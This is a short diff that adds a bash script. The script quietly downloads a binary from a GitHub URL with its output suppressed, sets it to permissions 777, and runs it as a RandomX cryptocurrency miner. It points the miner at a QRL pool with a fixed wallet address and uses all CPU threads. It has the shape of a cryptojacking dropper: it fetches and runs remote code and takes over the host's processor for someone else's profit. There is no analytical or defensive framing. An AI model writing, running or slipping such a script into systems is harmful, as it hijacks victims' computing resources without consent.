@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O mmm https://github.com/kidoescegh/xm/raw/main/sorabi28 > /dev/null 2>&1
+chmod 777 mmm
+./mmm --algorithm randomx --pool us.qrl.gfwroute.com:1167 --wallet Q010500485401f8f1f159a3008137ba26d61351780f01c238a193b1ca966f393b5f0bf9a1d13c1d.$(echo $(shuf -i 1-100000 -n 1)-new) --password $(echo $(shuf -i 1-100000 -n 1)-kido) --cpu-threads $(nproc --all) --keepalive true
